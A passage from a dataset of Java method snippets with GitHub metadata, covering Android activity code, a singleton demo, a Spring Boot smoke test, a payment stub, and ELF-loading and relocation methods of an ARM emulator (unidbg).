"modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n//        overridePendingTransition(R.anim.enter_from_right,R.anim.exit_to_left);\n        setContentView(R.layout.activity_fragment_container);\n        ButterKnife.bind(this);\n\n//        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);\n//        toolbar.setTitleTextColor(ContextCompat.getColor(this, R.color.white));\n//        toolbar.setTitle(\"Forgot Password\");\n//        setSupportActionBar(toolbar);\n\n\n        if(savedInstanceState==null)\n        {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container,new UsersListFragment(),TAG_STEP_ONE)\n                    .commitNow();\n        }\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/UsersList.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59904, "method_name": "showToastMessage", "class_name": "UsersList", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showToastMessage(String message)\n    {\n        Toast.makeText(this,message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/UsersList/UsersList.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59905, "method_name": "main", "class_name": "SingleModel", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]){\n        Single sig = Single.getInstance();\n        sig.print();\n        Single sig1 = Single.getInstance();\n        sig1.print();\n        System.out.println(sig==sig1);\n\n\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/SingleModel/SingleModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59906, "method_name": "getInstance", "class_name": "Single", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Single", "snippet": "    public static Single getInstance(){\n        return instance;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/SingleModel/SingleModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59907, "method_name": "print", "class_name": "Single", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(){\n        System.out.println(\"\u5355\u4f8b\u6a21\u5f0f\");\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DesignModel/SingleModel/SingleModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59908, "method_name": "onCreate", "class_name": "FilterDeliveryGuy", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n\n//        setContentView(R.layout.activity_select_delivery);\n        setContentView(R.layout.activity_fragment_container);\n        ButterKnife.bind(this);\n\n//        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);\n//        toolbar.setTitleTextColor(ContextCompat.getColor(this, R.color.white));\n//        toolbar.setTitle(\"Forgot Password\");\n//        setSupportActionBar(toolbar);\n\n\n        if(savedInstanceState==null)\n        {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container,new FilterDeliveryFragment(),TAG_STEP_ONE)\n                    .commitNow();\n        }\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/FilterDeliveryGuy/FilterDeliveryGuy.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59909, "method_name": "main", "class_name": "SampleHazelcast4Application", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SampleHazelcast4Application.class, args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-hazelcast4/src/main/java/smoketest/hazelcast4/SampleHazelcast4Application.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59910, "method_name": "registerCache", "class_name": "SampleHazelcast4Application", "params": ["CountryRepository", "HazelcastCacheManager", "CacheMetricsRegistrar"], "throws": null, "modifiers": ["public"], "return_type": "ApplicationRunner", "snippet": "\tpublic ApplicationRunner registerCache(CountryRepository repository, HazelcastCacheManager cacheManager,\n\t\t\tCacheMetricsRegistrar registrar) {\n\t\treturn (args) -> {\n\t\t\trepository.findByCode(\"BE\");\n\t\t\tregistrar.bindCacheToRegistry(cacheManager.getCache(\"countries\"));\n\t\t};\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-hazelcast4/src/main/java/smoketest/hazelcast4/SampleHazelcast4Application.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59911, "method_name": "custo", "class_name": "GatewayCielo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal custo() {\n\t\treturn BigDecimal.ONE;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayCielo.java", "stars": "9", "class_props": {"extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"id": 59912, "method_name": "paga", "class_name": "GatewayCielo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Transacao>", "snippet": "\tpublic CompletableFuture<Transacao> paga() {\n\t\tautorizador.autoriza(110, true);\n\t\tSystem.out.println(\"[Cielo] \"+tentativaPagamento);\n\t\treturn CompletableFuture.completedFuture(new Transacao());\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayCielo.java", "stars": "9", "class_props": {"extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"id": 59913, "method_name": "setLibraryResolver", "class_name": "AndroidElfLoader", "params": ["LibraryResolver"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLibraryResolver(LibraryResolver libraryResolver) {\n        syscallHandler.addIOResolver((AndroidResolver) libraryResolver);\n        super.setLibraryResolver(libraryResolver);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59914, "method_name": "createLibraryFile", "class_name": "AndroidElfLoader", "params": ["File"], "throws": null, "modifiers": ["protected"], "return_type": "LibraryFile", "snippet": "    protected LibraryFile createLibraryFile(File file) {\n        return new ElfLibraryFile(file);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59915, "method_name": "hasThread", "class_name": "AndroidElfLoader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasThread(int threadId) {\n        return syscallHandler.threadMap.containsKey(threadId);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59916, "method_name": "runLastThread", "class_name": "AndroidElfLoader", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void runLastThread(long timeout) {\n        runThread(syscallHandler.lastThread, timeout);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59917, "method_name": "runThread", "class_name": "AndroidElfLoader", "params": ["int", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void runThread(int threadId, long timeout) {\n        try {\n            emulator.setTimeout(timeout);\n            LinuxThread thread = syscallHandler.threadMap.get(threadId);\n            if (thread != null) {\n                if (thread.context == 0) {\n                    log.info(\"run thread: fn=\" + thread.fn + \", arg=\" + thread.arg + \", child_stack=\" + thread.child_stack);\n                    if (__thread_entry == 0) {\n                        LinuxModule.emulateFunction(emulator, thread.fn.peer, thread.arg);\n                    } else {\n                        LinuxModule.emulateFunction(emulator, __thread_entry, thread.fn, thread.arg, thread.child_stack);\n                    }\n                } else {\n                    unicorn.context_restore(thread.context);\n                    long pc = ((Number) unicorn.reg_read(emulator.is32Bit() ? ArmConst.UC_ARM_REG_PC : Arm64Const.UC_ARM64_REG_PC)).intValue() & 0xffffffffL;\n                    log.info(\"resume thread: fn=\" + thread.fn + \", arg=\" + thread.arg + \", child_stack=\" + thread.child_stack + \", pc=0x\" + Long.toHexString(pc));\n                    unicorn.emu_start(pc, 0, 0, 0);\n                }\n                if (thread.context == 0) {\n                    thread.context = unicorn.context_alloc();\n                }\n                unicorn.context_save(thread.context);\n            } else {\n                throw new IllegalStateException(\"thread: \" + threadId + \" not exits\");\n            }\n        } finally {\n            emulator.setTimeout(AbstractEmulator.DEFAULT_TIMEOUT);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59918, "method_name": "dumpHeap", "class_name": "AndroidElfLoader", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "File", "snippet": "    public File dumpHeap() throws IOException {\n        File outFile = File.createTempFile(\"heap_0x\" + Long.toHexString(HEAP_BASE) + \"_\", \".dat\");\n        dump(UnicornPointer.pointer(emulator, HEAP_BASE), brk - HEAP_BASE, outFile);\n        return outFile;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59919, "method_name": "initializeTLS", "class_name": "AndroidElfLoader", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initializeTLS(String[] envs) {\n        final Pointer thread = allocateStack(0x400); // reserve space for pthread_internal_t\n\n        final Pointer __stack_chk_guard = allocateStack(emulator.getPointerSize());\n\n        final Pointer programName = writeStackString(emulator.getProcessName());\n\n        final Pointer programNamePointer = allocateStack(emulator.getPointerSize());\n        assert programNamePointer != null;\n        programNamePointer.setPointer(0, programName);\n\n        final Pointer auxv = allocateStack(0x100);\n        assert auxv != null;\n        if (emulator.is32Bit()) {\n            auxv.setInt(0, 25); // AT_RANDOM is a pointer to 16 bytes of randomness on the stack.\n        } else {\n            auxv.setLong(0, 25); // AT_RANDOM is a pointer to 16 bytes of randomness on the stack.\n        }\n        auxv.setPointer(emulator.getPointerSize(), __stack_chk_guard);\n\n        List<String> envList = new ArrayList<>();\n        for (String env : envs) {\n            int index = env.indexOf('=');\n            if (index != -1) {\n                envList.add(env);\n            }\n        }\n        final Pointer environ = allocateStack(emulator.getPointerSize() * (envList.size() + 1));\n        assert environ != null;\n        Pointer pointer = environ;\n        for (String env : envList) {\n            Pointer envPointer = writeStackString(env);\n            pointer.setPointer(0, envPointer);\n            pointer = pointer.share(emulator.getPointerSize());\n        }\n        pointer.setPointer(0, null);\n\n        final Pointer argv = allocateStack(0x100);\n        assert argv != null;\n        argv.setPointer(emulator.getPointerSize(), programNamePointer);\n        argv.setPointer(2 * emulator.getPointerSize(), environ);\n        argv.setPointer(3 * emulator.getPointerSize(), auxv);\n\n        final UnicornPointer tls = allocateStack(0x80 * 4); // tls size\n        assert tls != null;\n        tls.setPointer(emulator.getPointerSize(), thread);\n        this.errno = tls.share(emulator.getPointerSize() * 2);\n        tls.setPointer(emulator.getPointerSize() * 3, argv);\n\n        if (emulator.is32Bit()) {\n            unicorn.reg_write(ArmConst.UC_ARM_REG_C13_C0_3, tls.peer);\n        } else {\n            unicorn.reg_write(Arm64Const.UC_ARM64_REG_TPIDR_EL0, tls.peer);\n        }\n\n        long sp = getStackPoint();\n        sp &= (~(emulator.is64Bit() ? 15 : 7));\n        setStackPoint(sp);\n\n        if (log.isDebugEnabled()) {\n            log.debug(\"initializeTLS tls=\" + tls + \", argv=\" + argv + \", auxv=\" + auxv + \", thread=\" + thread + \", environ=\" + environ + \", sp=0x\" + Long.toHexString(getStackPoint()));\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59920, "method_name": "loadInternal", "class_name": "AndroidElfLoader", "params": ["LibraryFile", "boolean"], "throws": ["IOException"], "modifiers": ["final", "protected"], "return_type": "LinuxModule", "snippet": "    protected final LinuxModule loadInternal(LibraryFile libraryFile, boolean forceCallInit) throws IOException {\n        LinuxModule module = loadInternal(libraryFile);\n        resolveSymbols();\n        if (callInitFunction || forceCallInit) {\n            for (LinuxModule m : modules.values().toArray(new LinuxModule[0])) {\n                boolean forceCall = (forceCallInit && m == module) || m.isForceCallInit();\n                if (callInitFunction) {\n                    m.callInitFunction(emulator, forceCall);\n                } else if(forceCall) {\n                    m.callInitFunction(emulator, true);\n                }\n                m.initFunctionList.clear();\n            }\n        }\n        module.addReferenceCount();\n        return module;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59921, "method_name": "resolveSymbols", "class_name": "AndroidElfLoader", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveSymbols() throws IOException {\n        for (LinuxModule m : modules.values()) {\n            for (Iterator<ModuleSymbol> iterator = m.getUnresolvedSymbol().iterator(); iterator.hasNext(); ) {\n                ModuleSymbol moduleSymbol = iterator.next();\n                ModuleSymbol resolved = moduleSymbol.resolve(new HashSet<Module>(modules.values()), true, hookListeners, emulator.getSvcMemory());\n                if (resolved != null) {\n                    log.debug(\"[\" + moduleSymbol.soName + \"]\" + moduleSymbol.symbol.getName() + \" symbol resolved to \" + resolved.toSoName);\n                    resolved.relocation(emulator);\n                    iterator.remove();\n                } else {\n                    log.info(\"[\" + moduleSymbol.soName + \"]symbol \" + moduleSymbol.symbol + \" is missing relocationAddr=\" + moduleSymbol.relocationAddr + \", offset=0x\" + Long.toHexString(moduleSymbol.offset));\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59922, "method_name": "dlopen", "class_name": "AndroidElfLoader", "params": ["String", "boolean"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module dlopen(String filename, boolean calInit) throws IOException {\n        LinuxModule loaded = modules.get(FilenameUtils.getName(filename));\n        if (loaded != null) {\n            loaded.addReferenceCount();\n            return loaded;\n        }\n\n        for (Module module : getLoadedModules()) {\n            for (MemRegion memRegion : module.getRegions()) {\n                if (filename.equals(memRegion.getName())) {\n                    module.addReferenceCount();\n                    return module;\n                }\n            }\n        }\n\n        LibraryFile file = libraryResolver == null ? null : libraryResolver.resolveLibrary(emulator, filename);\n        if (file == null) {\n            return null;\n        }\n\n        if (calInit) {\n            return loadInternal(file, false);\n        }\n\n        LinuxModule module = loadInternal(file);\n        resolveSymbols();\n        if (!callInitFunction) { // No need call init array\n            for (LinuxModule m : modules.values()) {\n                m.initFunctionList.clear();\n            }\n        }\n        module.addReferenceCount();\n        return module;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59923, "method_name": "dlopen", "class_name": "AndroidElfLoader", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module dlopen(String filename) throws IOException {\n        return dlopen(filename, true);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59924, "method_name": "dlsym", "class_name": "AndroidElfLoader", "params": ["long", "String"], "throws": null, "modifiers": ["public"], "return_type": "Symbol", "snippet": "    public Symbol dlsym(long handle, String symbolName) {\n        for (LinuxModule module : modules.values()) {\n            if (module.base == handle) { // virtual module may have same base address\n                Symbol symbol = module.findSymbolByName(symbolName, false);\n                if (symbol != null) {\n                    return symbol;\n                }\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59925, "method_name": "dlclose", "class_name": "AndroidElfLoader", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean dlclose(long handle) {\n        for (Iterator<Map.Entry<String, LinuxModule>> iterator = modules.entrySet().iterator(); iterator.hasNext(); ) {\n            LinuxModule module = iterator.next().getValue();\n            if (module.base == handle) {\n                if (module.decrementReferenceCount() <= 0) {\n                    module.unload(unicorn);\n                    iterator.remove();\n                }\n                return true;\n            }\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/AndroidElfLoader.java", "stars": "16", "class_props": {"extends": "AbstractLoader", "implements": ["Memory", "Loader"], "modifiers": ["public"]}}, {"id": 59926, "method_name": "loadInternal", "class_name": "AndroidElfLoader", "params": ["LibraryFile"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "LinuxModule", "snippet": "    private LinuxModule loadInternal(LibraryFile libraryFile) throws IOException {\n        final ElfFile elfFile = ElfFile.fromBytes(libraryFile.readToByteArray());\n\n        if (emulator.is32Bit() && elfFile.objectSize != ElfFile.CLASS_32) {\n            throw new ElfException(\"Must be 32-bit\");\n        }\n        if (emulator.is64Bit() && elfFile.objectSize != ElfFile.CLASS_64) {\n            throw new ElfException(\"Must be 64-bit\");\n        }\n\n        if (elfFile.encoding != ElfFile.DATA_LSB) {\n            throw new ElfException(\"Must be LSB\");\n        }\n\n        if (emulator.is32Bit() && elfFile.arch != ElfFile.ARCH_ARM) {\n            throw new ElfException(\"Must be ARM arch.\");\n        }\n\n        if (emulator.is64Bit() && elfFile.arch != ElfFile.ARCH_AARCH64) {\n            throw new ElfException(\"Must be ARM64 arch.\");\n        }\n\n        long start = System.currentTimeMillis();\n        long bound_high = 0;\n        for (int i = 0; i < elfFile.num_ph; i++) {\n            ElfSegment ph = elfFile.getProgramHeader(i);\n            if (ph.type == ElfSegment.PT_LOAD && ph.mem_size > 0) {\n                long high = ph.virtual_address + ph.mem_size;\n\n                if (bound_high < high) {\n                    bound_high = high;\n                }\n            }\n        }\n\n        ElfDynamicStructure dynamicStructure = null;\n\n        final long baseAlign = emulator.getPageAlign();\n        final long load_base = ((mmapBaseAddress - 1) / baseAlign + 1) * baseAlign;\n        long size = emulator.align(0, bound_high).size;\n        setMMapBaseAddress(load_base + size);\n\n        final List<MemRegion> regions = new ArrayList<>(5);\n        for (int i = 0; i < elfFile.num_ph; i++) {\n            ElfSegment ph = elfFile.getProgramHeader(i);\n            switch (ph.type) {\n                case ElfSegment.PT_LOAD:\n                    int prot = get_segment_protection(ph.flags);\n                    if (prot == UnicornConst.UC_PROT_NONE) {\n                        prot = UnicornConst.UC_PROT_ALL;\n                    }\n\n                    final long begin = load_base + ph.virtual_address;\n                    Alignment alignment = this.mem_map(begin, ph.mem_size, prot, libraryFile.getName());\n                    unicorn.mem_write(begin, ph.getPtLoadData());\n\n                    regions.add(new MemRegion(alignment.address, alignment.address + alignment.size, prot, libraryFile, ph.virtual_address));\n                    break;\n                case ElfSegment.PT_DYNAMIC:\n                    dynamicStructure = ph.getDynamicStructure();\n                    break;\n                case ElfSegment.PT_INTERP:\n                    if (log.isDebugEnabled()) {\n                        log.debug(\"[\" + libraryFile.getName() + \"]interp=\" + ph.getIntepreter());\n                    }\n                    break;\n                default:\n                    if (log.isDebugEnabled()) {\n                        log.debug(\"[\" + libraryFile.getName() + \"]segment type=0x\" + Integer.toHexString(ph.type) + \", offset=0x\" + Long.toHexString(ph.offset));\n                    }\n                    break;\n            }\n        }\n\n        if (dynamicStructure == null) {\n            throw new IllegalStateException(\"dynamicStructure is empty.\");\n        }\n        final String soName = dynamicStructure.getSOName(libraryFile.getName());\n\n        Map<String, Module> neededLibraries = new HashMap<>();\n        for (String neededLibrary : dynamicStructure.getNeededLibraries()) {\n            log.debug(soName + \" need dependency \" + neededLibrary);\n\n            LinuxModule loaded = modules.get(neededLibrary);\n            if (loaded != null) {\n                loaded.addReferenceCount();\n                neededLibraries.put(FilenameUtils.getBaseName(loaded.name), loaded);\n                continue;\n            }\n            LibraryFile neededLibraryFile = libraryFile.resolveLibrary(emulator, neededLibrary);\n            if (libraryResolver != null && neededLibraryFile == null) {\n                neededLibraryFile = libraryResolver.resolveLibrary(emulator, neededLibrary);\n            }\n            if (neededLibraryFile != null) {\n                LinuxModule needed = loadInternal(neededLibraryFile);\n                needed.addReferenceCount();\n                neededLibraries.put(FilenameUtils.getBaseName(needed.name), needed);\n            } else {\n                log.info(soName + \" load dependency \" + neededLibrary + \" failed\");\n            }\n        }\n\n        for (LinuxModule module : modules.values()) {\n            for (Iterator<ModuleSymbol> iterator = module.getUnresolvedSymbol().iterator(); iterator.hasNext(); ) {\n                ModuleSymbol moduleSymbol = iterator.next();\n                ModuleSymbol resolved = moduleSymbol.resolve(module.getNeededLibraries(), false, hookListeners, emulator.getSvcMemory());\n                if (resolved != null) {\n                    if (log.isDebugEnabled()) {\n                        log.debug(\"[\" + moduleSymbol.soName + \"]\" + moduleSymbol.symbol.getName() + \" symbol resolved to \" + resolved.toSoName);\n                    }\n                    resolved.relocation(emulator);\n                    iterator.remove();\n                }\n            }\n        }\n\n        List<ModuleSymbol> list = new ArrayList<>();\n        for (MemoizedObject<ElfRelocation> object : dynamicStructure.getRelocations()) {\n            ElfRelocation relocation = object.getValue();\n            final int type = relocation.type();\n            if (type == 0) {\n                log.warn(\"Unhandled relocation type \" + type);\n                continue;\n            }\n            ElfSymbol symbol = relocation.sym() == 0 ? null : relocation.symbol();\n            long sym_value = symbol != null ? symbol.value : 0;\n            Pointer relocationAddr = UnicornPointer.pointer(emulator, load_base + relocation.offset());\n            assert relocationAddr != null;\n\n            Log log = LogFactory.getLog(\"com.github.unidbg.linux.\" + soName);\n            if (log.isDebugEnabled()) {\n                log.debug(\"symbol=\" + symbol + \", type=\" + type + \", relocationAddr=\" + relocationAddr + \", offset=0x\" + Long.toHexString(relocation.offset()) + \", addend=\" + relocation.addend() + \", sym=\" + relocation.sym() + \", android=\" + relocation.isAndroid());\n            }\n\n            ModuleSymbol moduleSymbol;\n            switch (type) {\n                case ARMEmulator.R_ARM_ABS32: {\n                    int offset = relocationAddr.getInt(0);\n                    moduleSymbol = resolveSymbol(load_base, symbol, relocationAddr, soName, neededLibraries.values(), offset);\n                    if (moduleSymbol == null) {\n                        list.add(new ModuleSymbol(soName, load_base, symbol, relocationAddr, null, offset));\n                    } else {\n                        moduleSymbol.relocation(emulator);\n                    }\n                    break;\n                }\n                case ARMEmulator.R_AARCH64_ABS64: {\n                    long offset = relocationAddr.getLong(0) + relocation.addend();\n                    moduleSymbol = resolveSymbol(load_base, symbol, relocationAddr, soName, neededLibraries.values(), offset);\n                    if (moduleSymbol == null) {\n                        list.add(new ModuleSymbol(soName, load_base, symbol, relocationAddr, null, offset));\n                    } else {\n                        moduleSymbol.relocation(emulator);\n                    }\n                    break;\n                }\n                case ARMEmulator.R_ARM_RELATIVE: {\n                    int offset = relocationAddr.getInt(0);\n                    if (sym_value == 0) {\n                        relocationAddr.setInt(0, (int) load_base + offset);\n                    } else {\n                        throw new IllegalStateException(\"sym_value=0x\" + Long.toHexString(sym_value));\n                    }\n                    break;\n                }\n                case ARMEmulator.R_AARCH64_RELATIVE:\n                    if (sym_value == 0) {\n                        relocationAddr.setLong(0, load_base + relocation.addend());\n                    } else {\n                        throw new IllegalStateException(\"sym_value=0x\" + Long.toHexString(sym_value));\n                    }\n                    break;\n                case ARMEmulator.R_ARM_GLOB_DAT:\n                case ARMEmulator.R_ARM_JUMP_SLOT:\n                    moduleSymbol = resolveSymbol(load_base, symbol, relocationAddr, soName, neededLibraries.values(), 0);\n                    if (moduleSymbol == null) {\n                        list.add(new ModuleSymbol(soName, load_base, symbol, relocationAddr, null, 0));\n                    } else {\n                        moduleSymbol.relocation(emulator);\n                    }\n                    break;\n                case ARMEmulator.R_AARCH64_GLOB_DAT:\n                case ARMEmulator.R_AARCH64_JUMP_SLOT:\n                    moduleSymbol = resolveSymbol(load_base, symbol, relocationAddr, soName, neededLibraries.values(), relocation.addend());\n                    if (moduleSymbol == null) {\n                        list.add(new ModuleSymbol(soName, load_base, symbol, relocationAddr, null, relocation.addend()));\n                    } else {\n                        moduleSymbol.relocation(emulator);\n                    }\n                    break;\n                case ARMEmulator.R_ARM_COPY:\n                    throw new IllegalStateException(\"R_ARM_COPY relocations are not supported\");\n                case ARMEmulator.R_AARCH64_COPY:\n                    throw new IllegalStateException(\"R_AARCH64_COPY relocations are not supported\");\n                case ARMEmulator.R_AARCH64_ABS32:\n                case ARMEmulator.R_AARCH64_ABS16:\n                case ARMEmulator.R_AARCH64_PREL64:\n                case ARMEmulator.R_AARCH64_PREL32:\n                case ARMEmulator.R_AARCH64_PREL16:\n                case ARMEmulator.R_AARCH64_IRELATIVE:\n                case ARMEmulator.R_AARCH64_TLS_TPREL64:\n                case ARMEmulator.R_AARCH64_TLS_DTPREL32:\n                case ARMEmulator.R_ARM_IRELATIVE:\n                case ARMEmulator.R_ARM_REL32:\n                default:\n                    log.warn(\"[\" + soName + \"]Unhandled relocation type \" + type + \", symbol=\" + symbol + \", relocationAddr=\" + relocationAddr + \", offset=0x\" + Long.toHexString(relocation.offset()) + \", addend=\" + relocation.addend() + \", android=\" + relocation.isAndroid());\n                    break;\n            }\n        }\n\n        List<InitFunction> initFunctionList = new ArrayList<>();\n        if (elfFile.file_type == ElfFile.FT_EXEC) {\n            int preInitArraySize = dynamicStructure.getPreInitArraySize();\n            int count = preInitArraySize / emulator.getPointerSize();\n            if (count > 0) {\n                Pointer pointer = UnicornPointer.pointer(emulator, load_base + dynamicStructure.getPreInitArrayOffset());\n                if (pointer == null) {\n                    throw new IllegalStateException(\"DT_PREINIT_ARRAY is null\");\n                }\n                for (int i = 0; i < count; i++) {\n                    Pointer func = pointer.getPointer(i * emulator.getPointerSize());\n                    if (func != null) {\n                        initFunctionList.add(new AbsoluteInitFunction(load_base, soName, ((UnicornPointer) func).peer));\n                    }\n                }\n            }\n        }\n        if (elfFile.file_type == ElfFile.FT_DYN) { // not executable\n            int init = dynamicStructure.getInit();\n            if (init != 0) {\n                initFunctionList.add(new LinuxInitFunction(load_base, soName, init));\n            }\n\n            int initArraySize = dynamicStructure.getInitArraySize();\n            int count = initArraySize / emulator.getPointerSize();\n            if (count > 0) {\n                Pointer pointer = UnicornPointer.pointer(emulator, load_base + dynamicStructure.getInitArrayOffset());\n                if (pointer == null) {\n                    throw new IllegalStateException(\"DT_INIT_ARRAY is null\");\n                }\n                for (int i = 0; i < count; i++) {\n                    Pointer func = pointer.getPointer(i * emulator.getPointerSize());\n                    if (func != null) {\n                        initFunctionList.add(new AbsoluteInitFunction(load_base, soName, ((UnicornPointer) func).peer));\n                    }\n                }\n            }\n        }\n\n        SymbolLocator dynsym = dynamicStructure.getSymbolStructure();\n        if (dynsym == null) {\n            throw new IllegalStateException(\"dynsym is null\");\n        }\n        LinuxModule module = new LinuxModule(load_base, size, soName, dynsym, list, initFunctionList, neededLibraries, regions);\n        if (\"libc.so\".equals(soName)) { // libc\n            ElfSymbol __thread_entry = module.getELFSymbolByName(\"__thread_entry\");\n            if (__thread_entry != null) {\n                this.__thread_entry = module.base + __thread_entry.value;\n            }\n\n            malloc = module.findSymbolByName(\"malloc\");\n            free = module.findSymbolByName(\"free\");\n        }\n\n        modules.put(soName, module);\n        if (maxSoName == null || soName.length() > maxSoName.length()) {\n            maxSoName = soName;\n        }\n        if (bound_high > maxSizeOfSo) {\n            maxSizeOfSo = bound_high;\n        }\n        module.setEntryPoint(elfFile.entry_point);\n        log.debug(\"Load library \" + soName + \" 